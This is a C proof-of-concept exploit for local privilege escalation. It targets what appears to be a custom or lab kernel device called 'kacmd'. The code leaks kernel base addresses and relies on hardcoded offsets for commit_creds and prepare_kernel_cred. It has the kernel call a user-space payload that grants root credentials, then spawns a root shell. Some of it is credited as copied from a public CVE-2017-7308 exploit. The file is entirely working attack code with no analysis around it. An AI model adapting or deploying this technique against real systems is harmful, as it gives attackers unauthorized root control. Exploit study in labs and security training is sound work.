/* POC to exploit arbitrary read and
 * a kernel stack BOF with NX enabled
 * to gain local priv esc.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/types.h>

#include <alloca.h>

#include <kacmd.h>
#include <exp_commons.h>

#define KERNEL_CREDS 0xab7a0
#define COMMIT_CREDS 0xab3f0

unsigned long KERNEL_BASE;

// copied from https://github.com/xairy/kernel-exploits/blob/master/CVE-2017-7308/poc.c
typedef unsigned long __attribute__((regparm(3))) (* _commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (* _prepare_kernel_cred)(unsigned long cred);

void get_root_payload(void) {
	((_commit_creds)(KERNEL_BASE + COMMIT_CREDS))(
		((_prepare_kernel_cred)(KERNEL_BASE + KERNEL_CREDS))(0)
	);
}

void spawn_shell(void){
    system("/bin/sh");

    fini();
    exit(0);
}

int main(){
    struct kacmd_info_params kip;
    struct kacmd_info_resp kir;
	struct kacmd_call_params kcp;
    
    init();

    kip.cmd = KACMD_INFO;
    write_dev(cmd, (char*)&kip, sizeof(kip), 0);
    read_dev(cmd, (char*)&kir, sizeof(kir), 0);
    printf("[I] Vpg: %p Ppg: %p Epg: %p\n", kir.pg_vaddress, kir.pg_paddress, kir.exec_paddress);
    printf("[I] code: %p data: %p bss: %p\n", kir.kernel_code, kir.kernel_data, kir.kernel_bss);
    
	KERNEL_BASE = kir.kernel_code;
	kcp.cmd = KACMD_CALL_SIMPLE;
    kcp.address = &get_root_payload;
    
    write_dev(cmd, (char*)&kcp, sizeof(kcp), 0);

 	spawn_shell();   
}
